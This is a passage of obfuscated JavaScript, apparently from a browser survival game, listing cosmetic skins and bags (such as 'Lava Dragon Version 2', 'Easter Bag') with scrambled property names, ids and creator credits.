					"ᐃΔⵠ": ⵠ[21],
					name: "Mr. Watermelon"
				}, {
					id: 101,
					"ᐃΔⲆ": ⲆΔ.Δⵠⵠⵠⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔⲆⵠᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠΔⲆⵠΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆΔΔⲆⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Mr. Thornbush"
				}, {
					id: 131,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠΔⲆⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⵠΔⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⵠⵠΔΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃΔΔⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Cthulhu"
				}, {
					id: 143,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔⵠⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔΔᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆᐃⲆⵠⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⲆᐃᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mr. Cactus"
				}, {
					id: 144,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠΔⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃⵠⲆᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔᐃⵠΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⲆⲆᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Momo"
				}, {
					id: 180,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃᐃⲆⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔⵠⵠᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃΔᐃⵠΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠⵠⲆⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Scream"
				}, {
					id: 193,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆΔΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆΔᐃⵠΔΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃⲆΔⵠΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃᐃΔᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Dragon"
				}, {
					id: 195,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⲆⲆⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠⵠⵠⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⲆΔᐃᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔᐃⵠⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Forest Spirit"
				}, {
					id: 197,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠⲆⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠⲆΔΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃⲆᐃⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆΔⲆΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Evil Goat"
				}, {
					id: 199,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔⵠᐃⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃΔⵠⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔᐃΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Rotten"
				}, {
					id: 201,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃⲆⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃⵠᐃⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠΔⵠᐃΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆⲆⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Fossil"
				}, {
					id: 205,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⵠΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔⲆⲆᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔΔᐃᐃⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆΔⵠⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Spectrum"
				}, {
					id: 210,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔᐃΔΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔᐃᐃⲆᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⵠΔᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": "Helpy",
					name: "Black Cat"
				}, {
					id: 214,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃᐃᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠΔᐃᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃᐃΔⵠᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠΔⲆΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Lynx"
				}, {
					id: 215,
					"ᐃΔⲆ": ⲆΔ.ΔΔᐃΔⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆΔⲆⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃⵠΔⲆⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆᐃⵠᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Warg"
				}, {
					id: 217,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃΔⲆᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔⵠᐃᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔᐃⵠᐃᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆⲆΔⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Menhir"
				}, {
					id: 95,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔΔᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠⲆⵠᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆᐃᐃⲆⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔΔⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Mr. Garlic"
				}, {
					id: 76,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠⵠⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔΔⵠΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃΔⲆⲆᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⲆΔΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Robot Dragon"
				}, {
					id: 44,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆΔᐃᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃⲆⲆᐃΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔⵠΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Lava Dragon Version 1"
				}, {
					id: 90,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⵠⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆⵠΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⵠⵠⵠⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆᐃΔᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": "ExpertyAnimations",
					name: "Lava Dragon Version 2"
				}, {
					id: 124,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆΔⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔΔⲆΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⵠΔᐃΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆΔᐃΔᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lava Dragon Version 3"
				}, {
					id: 45,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠΔᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠΔⵠΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔᐃⲆᐃⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔⵠⲆⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[395],
					name: "Ice Dragon Version 1"
				}, {
					id: 46,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠΔⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆΔⵠᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⲆᐃⲆⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔΔᐃⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Ice Dragon Version 2"
				}, {
					id: 108,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠΔⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃΔⲆᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠⵠᐃΔᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠᐃⵠⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Ice Dragon Version 3"
				}, {
					id: 123,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔᐃΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆᐃⲆⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠΔᐃΔΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⲆⵠΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Baby Dragon Version 1"
				}, {
					id: 128,
					"ᐃΔⲆ": ⲆΔ.ᐃΔᐃΔⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⵠᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔⲆⵠⲆⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⵠⲆᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Baby Dragon Version 2"
				}, {
					id: 125,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆⵠᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠΔⵠⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⵠᐃΔΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠΔᐃᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Baby Lava"
				}, {
					id: 47,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⲆⲆⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⵠΔᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃⲆⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃᐃᐃⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Kraken"
				}, {
					id: 129,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆΔⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃΔΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔⲆΔⵠⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.Ⲇⵠᐃⵠⵠᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Sandworm"
				}, {
					id: 63,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠⲆᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆΔᐃⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠᐃⲆⵠΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆΔⵠⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Golden Bread"
				}, {
					id: 67,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠⲆΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠⵠᐃᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃⵠⲆⵠⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆⲆⵠᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": "ForgottenHeroe",
					name: "Starver Ores"
				}, {
					id: 130,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⵠⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠⲆΔⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃᐃΔΔΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⲆⵠᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Poo"
				}, {
					id: 89,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠⵠⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.Ⲇⵠⵠⵠᐃⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆᐃᐃⲆⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔΔⵠⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": "Poinet",
					name: "Volcano Starver"
				}, {
					id: 112,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⵠⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃⵠΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠΔΔᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆⵠⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lava Starver"
				}, {
					id: 183,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠⵠⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃΔᐃΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃⵠᐃΔⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃⵠⲆᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Revaster"
				}, {
					id: 192,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆΔᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔΔᐃᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⵠⵠΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⵠⲆⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Awakened"
				}, {
					id: 194,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠᐃⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆΔΔⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔᐃⲆᐃⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⵠᐃᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Ice Dragon"
				}, {
					id: 236,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃᐃΔΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⵠⲆⲆⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⲆⲆᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Crystal Dragon"
				}, {
					id: 208,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔΔᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔⵠΔΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠⲆΔⲆⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔΔᐃⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bone Dragon"
				}, {
					id: 216,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⲆⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃᐃⵠⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠΔⵠⲆⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⵠⵠᐃΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Warg Ghost"
				}, {
					id: 226,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠⵠⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃⲆⵠᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⵠⵠⲆⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠᐃⲆΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Cursed"
				}, {
					id: 48,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆᐃᐃⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔⵠⲆᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⲆⵠⵠΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⵠΔΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Robot"
				}, {
					id: 110,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃⲆᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆⲆᐃⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆΔΔⵠⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⵠΔΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Blue Butterfly"
				}, {
					id: 157,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆΔΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃⲆΔⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃⵠᐃⲆⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⵠⲆΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Yrifox"
				}, {
					id: 165,
					"ᐃΔⲆ": ⲆΔ.ⵠΔᐃⲆⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠⲆᐃΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔⵠΔᐃΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⲆᐃⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ,
					"ᐃΔⵠ": "OmarJr13",
					name: "Blob Skin"
				}, {
					id: 237,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃⲆⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃᐃⲆⲆᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃΔⲆΔᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆΔᐃᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ,
					"ᐃΔⵠ": "NotBonnie",
					name: "NotBonnie"
				}, {
					id: 238,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃᐃⲆᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔⵠᐃᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆΔⵠⲆΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⲆΔⲆⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ,
					"ᐃΔⵠ": "NotBonnie",
					name: "Cynder"
				}],
				"ⵠᐃᐃⵠ": [{
					id: ΔⲆⵠⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⲆᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃΔᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag 1"
				}, {
					id: 1,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠΔⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⲆᐃΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Bag"
				}, {
					id: 2,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠΔⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠΔΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag 2"
				}, {
					id: 3,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃᐃⵠⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⲆΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag 3"
				}, {
					id: Ⲇⵠⵠⵠ,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃᐃⲆⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⲆᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag 4"
				}, {
					id: 5,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆⵠⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⵠⵠΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag 5"
				}, {
					id: 11,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃΔΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠᐃᐃⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Wood Pickaxe Bag"
				}, {
					id: ⲆᐃᐃΔⵠⵠᐃ,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆΔⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔΔᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[22],
					name: "Wood Carrier"
				}, {
					id: 37,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠⵠΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔΔⵠΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag 6"
				}, {
					id: 39,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠⵠΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bag with Wooden Swords"
				}, {
					id: 44,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔΔΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃᐃΔᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Big Bag"
				}, {
					id: 7,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔΔⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⵠⵠᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[ⵠⲆᐃΔᐃ],
					name: "Bag 6"
				}, {
					id: ᐃⵠⵠⵠⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃⵠᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆᐃᐃᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Easter Bag"
				}, {
					id: 9,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔᐃⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⲆⲆⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Star Bag"
